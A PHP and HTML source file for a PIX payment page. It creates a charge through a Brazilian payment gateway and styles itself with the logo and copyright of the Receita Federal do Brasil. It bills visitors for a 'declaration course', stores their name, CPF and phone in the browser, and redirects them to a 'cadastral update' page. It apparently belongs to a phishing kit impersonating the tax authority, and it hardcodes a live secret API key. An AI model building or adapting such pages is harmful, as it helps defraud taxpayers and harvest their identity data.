<?php
$price = isset($_POST['price']) ? intval($_POST['price']) : 500; // Total amount em centavos
$customerName = isset($_POST['customerName']) ? trim($_POST['customerName']) : 'João Silva';
$customerCPF = isset($_POST['customerCPF']) ? preg_replace('/\D/', '', $_POST['customerCPF']) : '33852189772';
$customerEmail = 'email.silva@example.com';
$customerPhone = isset($_POST['customerPhone']) ? preg_replace('/\D/', '', $_POST['customerPhone']) : '11989111111';

$data = [
  'amount' => $price,
  'paymentMethod' => 'pix',
  'customer' => [
    'name' => $customerName,
    'email' => $customerEmail,
    'document' => [
      'number' => $customerCPF,
      'type' => 'cpf'
    ],
    'phone' => $customerPhone,
    'externalRef' => uniqid('cust_') // Gerando um identificador único
  ],
  'items' => [
    [
      'title' => 'Curso de Declaracao',
      'unitPrice' => $price,
      'quantity' => 1,
      'tangible' => false,
      'externalRef' => uniqid('item_') // Gerando um identificador único
    ]
  ]
];

$secretKey = 'sk_live_3wUJYTMoYQ7vI9KI2DiHhuuVqTrMSv8sHsHSPNmcLQ';

// Exibir dados no console para depuração
//echo "<script>console.log('Enviando API:', " . json_encode($data, JSON_UNESCAPED_SLASHES) . ");</script>";

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.conta.summitpagamentos.com/v1/transactions');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
  'Authorization: Basic ' . base64_encode($secretKey . ':x'),
  'Content-Type: application/json',
]);

$response = curl_exec($ch);

if (curl_errno($ch)) {
  echo 'Erro ao conectar: ' . curl_error($ch);
  exit;
}

$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

curl_close($ch);

function formatCPF($cpf)
{
  // Remove todos os caracteres que não sejam números
  $cpf = preg_replace('/\D/', '', $cpf);

  // Verifica se o CPF tem 11 dígitos
  if (strlen($cpf) !== 11) {
    return 'CPF inválido';
  }

  // Adiciona os pontos e o hífen na posição correta
  return preg_replace('/(\d{3})(\d{3})(\d{3})(\d{2})/', '$1.$2.$3-$4', $cpf);
}

$formattedCPF = formatCPF($customerCPF);

if ($httpCode === 200 || $httpCode === 201) {
  $transaction = json_decode($response, true);

  // Exibe os detalhes da transação no console
  //echo "<script>console.log('Resposta da API:', " . json_encode($transaction) . ");</script>";

  $transactionId = htmlspecialchars($transaction['id']);
  $qrcodeData = htmlspecialchars($transaction['pix']['qrcode']);
  //$qrcodeImageUrl = htmlspecialchars($transaction['pixQrCode']);

?>
<!DOCTYPE html><html><head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>Pagamento PIX</title>
    <link href="css/all.min.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @font-face {
            font-family: 'Rawline';
            src: url("fonts/rawline-400.ea42a37247439622.woff2") format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("fonts/rawline-600.844a17f0db94d147.woff2") format('woff2');
            font-weight: 600;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("fonts/rawline-700.1c7c76152b40409f.woff2") format('woff2');
            font-weight: 700;
            font-style: normal;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rawline', sans-serif;
        }
        body {
            background-color: #f8f9fa;
            padding-top: 60px;
            color: #333333;
            font-size: 16px;
            line-height: 1.5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 20px;
            background-color: white;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            height: 60px;
        }
        .logo {
            width: 140px;
            height: auto;
        }
        .header-icons {
            display: flex;
            gap: 15px;
        }
        .header-icon {
            font-size: 18px;
            color: #0056b3;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            padding: 0 20px;
            flex: 1;
        }
        .payment-info {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
            border-left: 4px solid #0c326f;
        }
        .payment-info h3 {
            color: #0c326f;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        .qr-container {
            text-align: center;
            margin: 20px 0;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-left: 4px solid #0c326f;
        }
        .qr-code {
            width: 200px;
            height: 200px;
            margin: 0 auto;
            background: #f8f9fa;
            padding: 10px;
            border-radius: 4px;
        }
        .pix-code {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 4px;
            margin: 20px 0;
            font-family: monospace;
            word-break: break-all;
            border: 1px dashed #dee2e6;
        }
        .copy-button {
            width: 100%;
            padding: 12px;
            background-color: #0c326f;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 20px 0;
            transition: all 0.3s ease;
        }
        .copy-button:hover {
            background-color: #092555;
            transform: translateY(-1px);
        }
        .timer-container {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        .timer {
            font-size: 36px;
            font-weight: 700;
            color: #dc3545;
            margin: 15px 0;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        .warning-text {
            font-weight: 600;
            margin-top: 10px;
            line-height: 1.4;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(220, 53, 69, 0); }
            100% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0); }
        }

        /* Loading screen styles */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0c326f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .content {
            display: none;
        }
        .footer {
            background-color: #01205B;
            color: white;
            padding: 16px;
            text-align: center;
            margin-top: 40px;
            width: 100%;
        }
        .footer-logo {
            width: 100px;
            margin: 0 auto 8px;
            display: block;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <img alt="Logo da Receita Federal" class="logo" src="images/receitaAzul.svg">
        <div class="header-icons">
            <i class="fas fa-search header-icon"></i>
            <i class="fas fa-question-circle header-icon"></i>
            <i class="fas fa-adjust header-icon"></i>
        </div>
    </div>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-spinner"></div>
        <p style="font-size: 18px; color: #333;">Gerando transação PIX...</p>
    </div>

    <!-- Main Content (initially hidden) -->
    <div class="content" id="mainContent">
        <div class="container">
            <div class="payment-info">
                <h3>Detalhes do Pagamento</h3>
                <p><strong>Nome: <?php echo htmlspecialchars($customerName); ?></strong></p>
                <p><strong>CPF: <?php echo htmlspecialchars($formattedCPF); ?></strong></p>
                <p><strong>Valor: R$ <?php echo number_format($price / 100, 2, ',', '.'); ?></strong></p>
            </div>

            <div class="qr-container">
                <h3>Escaneie o QR Code PIX</h3>
                <div id="qrCode" class="qr-code">
                    <img src="https://quickchart.io/qr?text=<?php echo urlencode($qrcodeData); ?>&size=300" alt="QR Code PIX" style="width: 100%; height: 100%; object-fit: contain;">
                </div>
            </div>

            <div style="margin: 20px 0;">
                <p style="margin-bottom: 10px; font-weight: 600;">Ou copie o código PIX:</p>
                <div id="pixCode" class="pix-code">
                    <?php echo htmlspecialchars($qrcodeData); ?>
                </div>
                <button onclick="copyPixCode()" class="copy-button">
                    <i class="fas fa-copy"></i>
                    Copiar código PIX
                </button>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="footer">
        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
    </footer>

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        let transactionId = "<?php echo $transactionId; ?>"; // ID da transação
        let checkInterval;
        let hasRedirected = false;

        const leadName = "<?php echo htmlspecialchars($customerName); ?>";
        const leadPhone = "<?php echo htmlspecialchars($customerPhone); ?>"; // Corrigido aqui
        const leadDocument = "<?php echo htmlspecialchars($customerCPF); ?>";

        function doRedirect() {
            if (hasRedirected) return;
            hasRedirected = true;

            try {
                localStorage.setItem('userData', JSON.stringify({
                    nome: leadName,
                    cpf: leadDocument,
                    phone: leadPhone
                }));
                clearInterval(checkInterval);
            } catch (e) {
                console.error('Erro nas operações pós-redirecionamento:', e);
            }

            window.location.href = '/atualizacaocadastral';
        }
        
        /*
        Payment States 
        Paid: paid
        Waiting: waiting_payment
        */

        function checkPaymentStatus() {
            if (hasRedirected) return;
            fetch(`check_payment.php?transactionId=${transactionId}`, {
                cache: 'no-store'
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'paid') {
                    doRedirect();
                }
            })
            .catch(console.error);
        }

        // Verificação de pagamento a cada 2 segundos
        checkInterval = setInterval(checkPaymentStatus, 2000);
        checkPaymentStatus(); // Checagem inicial

        // Exibir conteúdo após o carregamento
        setTimeout(() => {
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
        }, 1000);

        // Copiar código PIX
        window.copyPixCode = function() {
            const pixCode = document.getElementById('pixCode').textContent.trim();
            const copyButton = document.querySelector('.copy-button');
            navigator.clipboard.writeText(pixCode).then(
                function() {
                    copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado';
                    copyButton.style.backgroundColor = '#28a745';
                    setTimeout(() => {
                        copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
                        copyButton.style.backgroundColor = '#0c326f';
                    }, 2000);
                },
                function(err) {
                    console.error('Erro ao copiar:', err);
                    copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
                    copyButton.style.backgroundColor = '#dc3545';
                }
            );
        }
    });
</script>


</body></html>
<?php
} else {
  $errorResponse = json_decode($response, true);
?>
  <!DOCTYPE html>
  <html lang="pt-BR">

  <head>
    <meta charset="UTF-8">
    <title>Erro na Transação</title>
  </head>

  <body>
    <h1>Erro ao criar a transação</h1>
    <p>Status Code: <?php echo $httpCode; ?></p>
    <?php if (isset($errorResponse['message'])): ?>
      <p>Mensagem de erro: <?php echo htmlspecialchars($errorResponse['message']); ?></p>
    <?php else: ?>
      <p>Ocorreu um erro inesperado.</p>
    <?php endif; ?>
  </body>

  </html>
<?php
}
?>